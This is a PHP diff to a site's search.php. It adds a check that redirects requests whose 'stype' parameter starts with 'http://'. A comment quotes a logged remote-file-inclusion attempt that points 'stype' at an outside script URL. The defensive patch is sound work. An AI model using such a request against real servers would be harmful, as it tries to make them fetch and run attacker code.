@@ -1,6 +1,6 @@
 <?php
 	#
-	# $Id: search.php,v 1.4 2007-04-15 17:36:32 dan Exp $
+	# $Id: search.php,v 1.5 2007-10-02 14:33:11 dan Exp $
 	#
 	# Copyright (c) 1998-2006 DVL Software Limited
 	#
@@ -137,6 +137,18 @@ function WildCardQuery($stype, $Like, $query) {
 	if (IsSet($_REQUEST['casesensitivity'])) $casesensitivity	= AddSlashes(trim($_REQUEST['casesensitivity']));
 	if (IsSet($_REQUEST['orderby']))         $orderby			= AddSlashes(trim($_REQUEST['orderby']));
 	if (IsSet($_REQUEST['orderbyupdown']))   $orderbyupdown		= AddSlashes(trim($_REQUEST['orderbyupdown']));
+	
+	# we have a problem with people doing this:
+	#
+	# 83.85.93.90 - - [02/Oct/2007:04:18:00 -0400] "GET /search.php?stype=http://amyru.h18.ru/images/cs.txt? HTTP/1.1" 301 332 "-" "Wget/1.1 (compatible; i486; Linux; RedHat7.3)"
+	# well, it's not so much a problem as an annoyance.  So we will redirect their ass eslewhere.
+	#
+	
+	if (substr($stype, 0, 7) === 'http://') {
+	  # redirect their ass
+	  header('Location: http://news.freshports.org/2007/10/02/odd-way-to-break-in/');
+	  exit;
+	}
 
 	if ($stype == SEARCH_FIELD_MESSAGEID) {
 		header('Location: http://' . $_SERVER['HTTP_HOST'] . "/commit.php?message_id=$query");
